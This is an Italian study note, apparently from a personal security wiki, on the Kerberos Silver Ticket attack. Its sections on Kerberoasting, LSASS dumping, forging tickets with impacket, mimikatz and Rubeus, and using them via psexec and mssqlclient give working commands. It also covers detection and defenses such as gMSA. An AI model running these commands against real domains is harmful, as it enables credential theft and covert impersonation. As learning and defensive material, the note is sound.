---

tags:

- silver-ticket
- kerberos
- active-directory
- persistence
- credential-forgery
- post-exploit
- hacking-exposed-7 aliases:
- Silver Ticket
- TGS forgery
- service ticket forgery

---

# Silver Ticket — Forgia un TGS e Skippa il KDC

## 1. Il concetto

> **Silver Ticket** è la forgia diretta di un **TGS** (Service Ticket) usando l'hash NT di un service account, **skippando completamente il KDC**.

Mentre il [[Golden Ticket]] è "diventare il KDC", il Silver Ticket è "diventare il **servizio**" — limitato in scope ma molto più stealth.

> [!abstract] Il pattern in una frase Possiedi l'hash di un service account → puoi firmare TGS validi per quel servizio specifico → accedi a quel servizio senza che il KDC veda nulla.

---

## 2. Ripasso veloce — perché funziona

Nel flusso Kerberos normale:

```
Client ── TGS-REQ ──→ KDC ── TGS-REP ──→ Client ── presenta TGS ──→ Servizio
                      │                                              │
                      └ firma TGS con                                └ verifica TGS
                        hash service account                          decifrandolo con
                                                                      la sua chiave (=hash)
```

Il **servizio** verifica il TGS decifrandolo con il proprio NT hash. Se decifra correttamente → TGS valido → accesso garantito.

### Il punto debole

Il servizio **non comunica col KDC** per validare il TGS. Si fida del fatto che solo il KDC abbia potuto firmarlo correttamente. Ma se TU hai l'hash del service account, puoi **anche tu** firmare un TGS valido.

```
Attaccante (con hash MSSQLSvc) ── presenta TGS forgiato ──→ MSSQL Server
                                                              │
                                                              └ decifra con hash MSSQLSvc
                                                                → valido!
                                                                → accesso garantito
                                                              
                                                            (KDC non viene MAI contattato)
```

---

## 3. Confronto diretto con Golden Ticket

|Aspetto|Golden Ticket|Silver Ticket|
|---|---|---|
|**Chiave necessaria**|NT hash di **krbtgt**|NT hash di un **service account**|
|**Cosa forgia**|TGT|TGS direttamente|
|**Coinvolge KDC?**|Sì (per richiedere TGS)|**No** (skip totale)|
|**Scope**|Tutto il dominio|Un servizio specifico|
|**Validità default**|10 anni (puoi mettere quello che vuoi)|10 anni (puoi mettere quello che vuoi)|
|**Persistenza fino a...**|Krbtgt rotation x2|Service account password change|
|**Stealth**|Media (Event 4769 sul DC)|**Altissima** (no traffic al DC)|
|**Difficoltà di ottenere la chiave**|Alta (serve DCSync)|Media ([[kerberoasting]] basta)|

> [!tip] Trade-off chiave Golden Ticket è **più potente** (tutto il dominio) ma **meno stealth** (passa dal KDC). Silver Ticket è **meno potente** (un servizio) ma **invisibile al KDC**.
> 
> In un red team engagement con monitoring aggressivo del DC, Silver Ticket può essere preferibile.

---

## 4. Come ottenere l'hash del service account

A differenza del Golden Ticket che richiede DCSync (high-bar), il Silver Ticket può essere fatto con tecniche meno invasive:

### Kerberoasting — la via principale

Già coperto come concetto. Quick recap:

```bash
impacket-getuserspns corp.local/lowuser:password -dc-ip 10.0.0.1 -request

# Output: hash TGS-REP in formato hashcat
# $krb5tgs$23$*svc_sql$CORP.LOCAL$...

hashcat -m 13100 hash.txt rockyou.txt
# Cracka la password offline
```

Poi calcoli l'NT hash della password crackata:

```python
import hashlib
nt_hash = hashlib.new('md4', "P@ssw0rd!".encode('utf-16-le')).hexdigest()
```

Oppure usi direttamente la **chiave AES** del service account se Kerberos AES è in uso (impacket può estrarla).

### LSASS dump

Su una macchina dove il service account è loggato/in esecuzione:

```
pypykatz lsa minidump lsass.dmp
# Estrae hash di tutti gli account loggati
```

### DCSync (se ce l'hai)

Se hai già DCSync, hai TUTTI gli hash incluso ogni service account. Allora di solito vai direttamente al Golden Ticket — ma puoi anche fare Silver per stealth.

### Stored credentials

Service account spesso hanno password riusate, salvate in:

- Group Policy Preferences (legacy, decifrabile)
- Scripts di installazione
- File di configurazione applicativi

---

## 5. Forgiare un Silver Ticket — i tool

### Cosa serve

|Dato|Da dove|
|---|---|
|**NT hash del service account**|Kerberoasting + crack, o memory dump, o DCSync|
|**Domain SID**|`whoami /user`|
|**SPN target**|`MSSQLSvc/sql01.corp.local:1433`, `CIFS/fileserver.corp.local`, ecc.|
|**Username da impersonare**|Qualsiasi (anche Administrator built-in)|

### Con impacket-ticketer

```bash
impacket-ticketer \
    -nthash <SERVICE_ACCOUNT_NTHASH> \
    -domain-sid S-1-5-21-... \
    -domain corp.local \
    -spn MSSQLSvc/sql01.corp.local:1433 \
    fakeadmin

# Output: fakeadmin.ccache
```

Nota la differenza chiave da Golden Ticket: **`-spn`** specifica il servizio target.

### Con mimikatz

```
mimikatz # kerberos::golden 
    /domain:corp.local 
    /sid:S-1-5-21-...
    /target:sql01.corp.local
    /service:MSSQLSvc
    /rc4:<SERVICE_ACCOUNT_NTHASH>
    /user:fakeadmin
    /id:500
    /groups:512
    /ptt
```

> [!note] `kerberos::golden` con `/service` = Silver Ticket Mimikatz usa lo stesso comando per entrambi i ticket. La presenza di `/service` e `/target` (e l'hash di un service account invece di krbtgt) lo rende Silver invece di Golden.

### Con Rubeus

```powershell
Rubeus.exe silver /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /rc4:<HASH> /service:MSSQLSvc/sql01.corp.local /ptt
```

---

## 6. SPN comuni e cosa permettono

L'**SPN** (Service Principal Name) determina **a quale servizio** il ticket dà accesso. Esempi rilevanti:

|SPN|Cosa permette|
|---|---|
|`HOST/server.corp.local`|Accesso amministrativo al server (psexec-like, WMI, scheduled tasks)|
|`CIFS/server.corp.local`|Accesso alle share SMB del server|
|`LDAP/dc.corp.local`|Query LDAP — **con questo puoi fare DCSync** se l'hash è del DC stesso|
|`HTTP/web.corp.local`|Accesso autenticato a IIS/WinRM|
|`MSSQLSvc/sql.corp.local:1433`|Accesso al database SQL Server|
|`TERMSRV/server.corp.local`|RDP|

> [!tip] HOST è il jackpot Un Silver Ticket con SPN `HOST/<server>` dà accesso amministrativo praticamente completo a quel server — psexec, WMI, scheduled tasks. Per molti scenari è equivalente a "Administrator su quella macchina".

> [!warning] LDAP service tickets Con un Silver Ticket valido per `LDAP/<DC>` e l'hash di un account computer del DC stesso (raro ma esiste in scenari trust complessi), puoi triggerare DCSync. Questa è la combo che porta da Silver a "tutto il dominio" se le condizioni sono giuste.

---

## 7. Uso del ticket

```bash
# 1. Forgia il ticket per MSSQL
impacket-ticketer -nthash HASH -domain-sid SID -domain corp.local \
    -spn MSSQLSvc/sql01.corp.local:1433 fakeadmin

# 2. Esporta
export KRB5CCNAME=fakeadmin.ccache

# 3. Connetti al servizio (usando FQDN obbligatorio)
impacket-mssqlclient corp.local/fakeadmin@sql01.corp.local -k -no-pass

# Per HOST SPN:
impacket-psexec corp.local/fakeadmin@server.corp.local -k -no-pass

# Per CIFS SPN:
smbclient.py corp.local/fakeadmin@server.corp.local -k -no-pass
```

Stesso requisito di Golden Ticket: **usa FQDN, non IP**.

---

## 8. Detection — perché è il vero killer

### Cosa NON viene loggato

Il KDC non viene contattato. Quindi:

- ❌ Nessun Event 4768 (TGT request)
- ❌ Nessun Event 4769 (TGS request) sul DC
- ❌ Nessun pattern di lifetime anomalo sul DC

### Cosa potrebbe essere loggato

Solo dal **servizio target**, se ha logging Kerberos:

- Event 4624 (Successful logon) — ma sembra legittimo
- Application-level logs del servizio (SQL audit, IIS log)

In pratica, **se l'audit del servizio è blando** (default Windows), Silver Ticket è quasi invisibile.

### Detection indiretta

|Indicatore|Note|
|---|---|
|**Anomalous PAC fields**|Username inesistente in AD ma logon riuscito sul server|
|**Mismatch tra access logs e auth logs**|Servizio loggato come Administrator ma DC non emette ticket|
|**Time skew**|Forgiati spesso hanno timestamp arrotondati|
|**Servizio accessibile da host inatteso**|Lateral movement analytics|

> [!warning] Realtà operativa La detection di Silver Ticket richiede **correlazione cross-source** tra log del servizio e log del DC. È molto raro che le aziende abbiano questa visibilità.

---

## 9. Difese

### Primarie

|Difesa|Come funziona|
|---|---|
|**Rotation password service account**|Invalida ticket esistenti — best practice 6-12 mesi|
|**Managed Service Accounts (MSA/gMSA)**|Account con password gestita automaticamente da AD, rotation automatica|
|**PAC validation enforcement**|Servizi che validano il PAC contro AD live (overhead, raro abilitato)|
|**Strong service account passwords**|Resistenti a Kerberoasting crack offline|
|**AES Kerberos only**|Disabilita RC4 → Kerberoasting offline più difficile|

### Secondarie

|Difesa|Come funziona|
|---|---|
|**Application-level logging**|SQL Server audit, IIS logging dettagliato|
|**SIEM cross-source correlation**|Logon riusciti sul servizio senza corrispondente 4769 sul DC|
|**Account anomaly detection**|Defender for Identity rileva pattern atipici|
|**Honey services**|Servizio "esca" che alerta su qualsiasi tentativo di autenticazione|

### Group Managed Service Accounts (gMSA) — la soluzione moderna

Microsoft ha introdotto **gMSA** proprio per mitigare il problema dei service account:

- Password generata e ruotata automaticamente da AD (default 30 giorni)
- 240+ caratteri di entropia → no Kerberoasting crack offline
- Tied to specific computer accounts → no abuse cross-host

Se un'azienda usa gMSA correttamente, Silver Ticket diventa molto più difficile.

---

## 10. Quando usare Silver vs Golden

```
Decision tree per un red teamer:

Hai krbtgt hash? 
    ├── Sì → Golden Ticket (potenza massima)
    │       Quando vuoi stealth → forgi Golden con lifetime standard (10h)
    │
    └── No → Hai service account hash?
            ├── Sì → Silver Ticket
            │       - Per persistenza su servizio specifico
            │       - Per evitare il KDC monitoring
            │       - Per accesso targeted a database/web/file server
            │
            └── No → Torna a Kerberoasting / credential dumping
```

**Scenari tipici Silver Ticket:**

- Target ha un SIEM che monitora il KDC → Silver skip totale
- Vuoi persistenza sul singolo DB server (SQL) senza rischiare detection di DCSync
- Hai crackato un service account ma non hai (ancora) DCSync rights

---

## 11. Una variante interessante — Silver Ticket sul DC

Se ottieni l'hash NT del **computer account di un DC** (rarissimo ma possibile in scenari trust o tramite credential dumping su DC stesso):

- Forgi un Silver Ticket per `LDAP/<DC>.corp.local`
- Quell'SPN ti permette query LDAP autenticate **dal DC stesso**
- DCSync è una query LDAP particolare → puoi farla
- Hai effettivamente "promosso" il Silver Ticket a Golden Ticket di facto

Questo è un pattern avanzato ma documenta perché HOST/LDAP SPN su DC sono target di alto valore.

---

## Takeaways

1. **Silver Ticket = TGS forgiato** direttamente, senza passare dal KDC
2. **Trade-off**: meno potente di Golden (scope limitato) ma molto più stealth (no traffic al KDC)
3. **Prerequisito**: hash NT di un service account, ottenibile via **Kerberoasting** (più accessibile di DCSync)
4. **SPN target** determina cosa puoi fare: HOST → admin macchina, CIFS → share, MSSQLSvc → DB, ecc.
5. **Detection difficile** — il KDC non vede nulla, servono solo log del servizio + correlation
6. **Difesa principale**: gMSA (rotation automatica password), strong password, AES-only Kerberos
7. **Pattern Silver → "Golden"**: Silver Ticket per LDAP SPN su DC + abuse di DCSync rights = full domain compromise via stealth
8. **Concetto per esame**: ogni service account è un'autorità per il proprio servizio, gli SPN sono la mappa dei target

---

## Wiki-links

- [[Golden Ticket]]
- [[dcsync]]
- [[kerberoasting]]
- [[GetNPUsers - AS-REP Roasting]]
- [[Active Directory (AD)]]
- [[Lateral Movement]]
- [[Privilege Escalation Windows]]
- [[HTB - Sauna]]
- [[impacket]]
- [[mimikatz]]
- [[rubeus]]
- [[gmsa]]
- [[mitre_attck]]
- [[hacking_exposed_7_windows]]